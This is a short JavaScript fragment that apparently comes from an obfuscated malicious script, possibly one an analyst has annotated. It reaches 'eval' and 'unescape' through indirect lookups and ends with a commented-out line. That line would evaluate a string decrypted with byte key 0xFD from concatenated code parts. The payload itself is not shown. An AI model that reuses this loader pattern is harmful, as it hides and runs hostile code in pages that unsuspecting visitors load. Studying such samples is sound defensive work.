...
function ty32(){
	return get_index_at("eval", get_index_at("target", event));
}

var eval_function = ty32();

function dsm33() {
	return eval_function("unescape");
}	

var unescape_function = dsm33();
//eval_function(decrypt_string_with_byte(unescape_function(code_part_1+code_part_2), 0xFD));
